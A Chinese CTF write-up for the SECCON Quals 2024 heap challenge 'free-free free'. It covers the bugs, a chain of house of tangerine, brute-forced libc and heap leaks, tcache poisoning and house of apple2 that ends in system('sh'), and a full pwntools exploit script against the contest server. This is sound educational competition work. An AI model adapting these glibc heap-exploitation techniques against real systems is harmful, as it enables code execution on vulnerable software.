---
date: 2024-11-24 10:29:05
layout: post
title: SECCON Quals 2024 free-free free writeup
subtitle: 
description: >-
    不是很难的堆题，trick 也不多
image: >-
  /assets/img/uploads/autumn.jpg
optimized_image: >-
  /assets/img/uploads/autumn.jpg
category: ctf
tags:
  - SECCON
  - pwn
  - heap exploitation
author: rosayxy
paginate: true
---
打完比赛当天晚上就出了这个题，感觉稍微有点可惜hhh ~ 毕竟在边做题边刷购物软件（逃）的摆烂状态下大概也就花了 10 小时... 只能说要是比赛的时候不一直纠结那个傻子 format string （Paragraph），早点开这个题就好了 ~ ggggg     
下面是 writeup    
## 漏洞
题目给了源码，所以直接看源码就行，整体是一个链表，但是 free 的时候只有纯的链表操作，malloc 只能申请 tcache 大小范围的堆块，**没有真正的 free 函数调用**，此外没有 show 函数，所以看上去挺难的样子        
漏洞如下：
- edit 函数有一个8字节溢出
- release 函数结束的边界检查不对，for 结束条件应该是和 tail 指针比较，它这里在初始化的时候就没有清空 `next` 指针，所以申请出的块 fd 是有值的，则可以进行 fd 的写入
  ```c
  	for(data_t *p = &head; p->next; p = p->next)
		if(p->next->id == id){
			// free-free is more secure
			if(tail == p->next)
				tail = p;
			p->next = p->next->next;
			return 0;
		}
  ```
## 利用思路
1. bypass no-free   
首先解决没有 `free` 的问题，这里我们用 **house of tangerine** 也就是高版本下的 **house of orange**，但是 [how2heap](https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_tangerine.c) 最终的利用效果是任意已知地址分配，但是需要写 fd 而我们这里并不能办到，我们退而求其次，可以往 `tcache`/`smallbins` 里面扔堆块
2. libc leak   
在上一步中，我们在 `smallbins` 里面扔堆块，如果申请出来，它 `fd` `bk` 里面都会有 libc 地址残留，而 fd 和申请出的 `next` 指针地址一致，所以该指向的 libc 内存可以在 `edit` 的时候被当作一个 `Data` 的结构体然后做操作，此时域的对应关系如图：
![alt_text](/assets/img/uploads/return_smallbin.png)
![alt_text](/assets/img/uploads/fake_struct.png)
通过一个字节的爆破，我们可以拿到 libc 地址的第五个字节，而通过它输出的提示信息 `printf("data(%u): ", p->len);` 我们可以把低位也给拿到，这样就可以拿到 libc 的 leak 了
3. heap leak
但是在上一步中，我们把 smallbin 拿出来后，会把其余的 smallbin 都给塞到 tcache 里面去，所以原本的 libc 处的 smallbin 双向链表就没了   
我们的预期还是通过 libc 区域的 fake chunk 去 leak heap，所以我们增大一开始往 tcache/smallbin 扔堆块的数量，一下扔超过15个堆块，这样我们申请出一个 smallbin 块的时候，libc 区域还是有堆地址残留，如下图   
![alt_text](/assets/img/uploads/heap_address.png)
但是我们该怎么把这个地址伪造成一个块的开头呢？即是我们该怎么把 0x7f5a155dff00 地址塞到一个块的 next 指针去？   
思路大概是这样的：
- 首先我们注意到 0x7f5a155dfef0 是很容易被伪造为 Data 结构体的，只要把一个 smallbin 塞到题目中的链表中就大概率有 ~   
- 然后 0x7f5a155dfef0 处 fake Data struct 的 next 是 0x7f5a155dfee0，也就是这个地址会也被当成一个 Data struct，但是他们俩的 index 是重的，所以操作的时候只会操作到 0x7f5a155dfef0 处的 Data struct   
- 我们通过 release(0x7f5a) 把 0x7f5a...ee0 处内存当成 fake struct 这样就可以改 0x7f5a...ef00 处的内容了 我们改成 0x7f5a...f000 这样当我们再次通过 smallbin 把 0x7f5a155dfef0 当成 data 结构体时，它 next 指针会指向 0x7f5a155df000，进一步把 0x7f5a155df000 当成 Data 结构体，则可以用爆破index + len 的方法拿堆地址
- 浅画了个图
  ![alt_text](/assets/img/uploads/demo.jpg)

4. tcache poisoning
当我们爆破堆地址时，我们就可以操纵一个 smallbin 里面的块，但是我们现有条件很难打 house of Lore 之类的针对 smallbin 的方法，不如上 tcache poisoning     
这时候我们再往链表里面扔一个 smallbin chunk，它的 next 指向了 0x7f...ef0 which in turn 指向了 0x7f...f00   
我们通过操纵 0x7f...ef0 的 fake Data struct，把 0x7f...f00 处的内存改向 tcache_chunk_addr - 0x10 然后 release(0x7f51) 把 tcache chunk - 0x10 链入题目链表，就可以操纵 tcache chunk 的 fd 了!!   
接下来就是常规的 house of apple2，就不多赘述了    

## exp
```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
libc = ELF("./libc.so.6")
p=remote("free3.seccon.games",8215)
# p=process("./chall")
def add(siz):
    p.sendlineafter("> ", "1")
    p.sendlineafter("size: ", str(siz))
    p.recvuntil("ID:")
    index = int(p.recvline().decode().strip("\n").split(" ")[0], 16)
    print(hex(index))
    return index
def edit(index, content):
    p.sendlineafter("> ", "2")
    p.sendlineafter("id: ", hex(index))
    p.sendafter("data", content)

def delete(index):
    p.sendlineafter("> ", "3")
    p.sendlineafter("id: ", hex(index))

index1 = add(0x400)
delete(index1)
index2 = add(0x390)
index3 = add(0x1b0)

edit(index3,b"a"*0x1a8+b"\x01\x04"+b"\n")

index4 = add(0x400)
index5 = add(0x3f0)

index6 = add(0x3e0)
delete(index2)
delete(index3)
delete(index4)
delete(index5)
edit(index6,b"a"*0x3d8+b"\x01\x04\n")
delete(index6)
# index8 = add(0x400)

for i in range(25):
    index1 = add(0x400)
    delete(index1)
    index2 = add(0x3f0)
    delete(index2)
    index3 = add(0x3e0)
    edit(index3,b"a"*0x3d8+b"\x01\x04\n")
    delete(index3)


for i in range(7):
    idx = add(0x3d0)
    delete(idx)

idx = add(0x3d0)
# 爆破 libc 前面
line = ""
num = 0
for i in range(0x100):
    num = 0x7f00+i
    p.sendlineafter("> ", "2")
    p.sendlineafter("id: ", hex(0x7f00+i))
    line = p.recv(4).decode().strip("\n")
    if "data" in line:
        break
print(line)
line = p.recvuntil(": ")
print(line)
libc_lower = line.decode().split("(")[1].split(")")[0]
libc_leak = int(libc_lower,10)+num*0x100000000
print(hex(libc_leak))
libc_num = num

#  0x7f951159e000 0x7f95117a1ee0
libc_base = libc_leak - 0x7a1ee0 + 0x59e000
offset = 0x203ee0
# try heap leak
p.sendline("") # 这里先不写 防止覆盖堆指针
delete(num) # 防止 index 冲突
# do edit
edit(num,p64(libc_leak+0x20)[:6]+b"\n")
for i in range(7): # 耗尽 tcache
    idx = add(0x3d0)
    delete(idx)

num = add(0x3d0) # 搞个有 libc 地址的 smallbin 出来
delete(num)
# 爆破 heap
heap_idx = 0
for i in range(0x100):
    heap_idx = 0x5500+i
    p.sendlineafter("> ", "2")
    p.sendlineafter("id: ", hex(0x5500+i))
    line = p.recv(4).decode().strip("\n")
    if "data" in line:
        break
    heap_idx = 0x5600 + i
    p.sendlineafter("> ", "2")
    p.sendlineafter("id: ", hex(0x5600+i))
    line = p.recv(4).decode().strip("\n")
    if "data" in line:
        break

print(line)
line = p.recvuntil(": ")
print(line)
heap_lower = line.decode().split("(")[1].split(")")[0]
heap_leak = int(heap_lower,10)+heap_idx*0x100000000
print(hex(heap_leak))
print(hex(libc_base))
# trigger
p.sendline("")
# 0x558f96911c00 0x558f96604000 heap_leak 对应的块在 small bins 里面
heap_base = heap_leak - 0x911c00+0x604000

# 到这里可以开始 uaf 了 直接上 smallbin 可能有点难 上 tcache poisoning 吧


for i in range(7):
    idx = add(0x3d0)
    delete(idx)
    
idx1 = add(0x3d0)

delete(idx1)
io_list_all = libc_base + libc.sym["_IO_list_all"] - 0x10
# 不对 fd 还要做和它地址的异或
# 0x563a5e2e5c10 0x563a5df94000
cur_heap_addr = heap_base + 0x351c00
print(hex(heap_idx))
print(hex(cur_heap_addr))
edit(libc_num,p64(cur_heap_addr)[:6]+b"\n")

edit(0,p64(io_list_all^(cur_heap_addr>>12))[:6]+b"\n")
print(hex(cur_heap_addr))

# 0x555d869efc10 0x555d869efc00
idx1 = add(0x3d0)
# io_file
io_file_addr = cur_heap_addr + 0x20
io_file = b"  sh;"
io_file = io_file.ljust(0x20, b"\x00")
io_file += p64(1)+p64(2)
io_file = io_file.ljust(0x68, b"\x00")+p64(libc_base+libc.symbols["system"])
io_file = io_file.ljust(0x88, b"\x00")+p64(io_file_addr + 0xe8)
io_file = io_file.ljust(0xa0, b"\x00")+p64(io_file_addr)
io_file = io_file.ljust(0xd8, b"\x00")+p64(libc_base + 0x202228)+p64(io_file_addr)+p64(0)+p64(io_file_addr+0x100)
edit(idx1, io_file[:0xf7]+b"\n") # TODO 改这里长度
delete(idx1)
idx2 = add(0x3d0)

edit(idx2,p64(cur_heap_addr+0x20)[:6]+b"\n")
# trigger
# gdb.attach(p)
# pause()
p.sendlineafter("> ", "0")
p.interactive()
```
## 总结
- 嗯 我们一开始往 tcache+smallbin 里面扔了27个块，很壮观（误）
- 然后这次比赛其他几道题：
  - Paragraph 是格式化字符串。但是字符串长度限制23字节，此外没有循环所以每次都需要覆盖返回地址回到 main 函数，在3次很 dirty 很 trick 的尝试之后 leak 了 stack 和 libc 并且回到了 main，之后的问题是无法一次任意写两个地址，而且 one_gadget 不可用 partial overwrite 效果不好。以及连打十多个小时的 format string 真的太要命了，建议加入十大酷刑（逃
  - make ROP great again 直接用栈上 libc 地址，把他改为 one_gadet 会涉及到一个 1/4096 概率的爆破，本地可以出 但是远程一直爆破不出来... 比较奇怪。此外也有队友 leak 出来了 libc 但是这样会把 gets 的 lock 覆盖为非零值，下一次回到 main 然后 gets 会卡死，然后也没找到啥绕过的方法
  - TOY 那个题没看，babyQemu dylanyang 学长在赛后出了（学长 tql!），准备学一下入一下 Qemu qaq

![alt_text](/assets/img/uploads/seccon.png)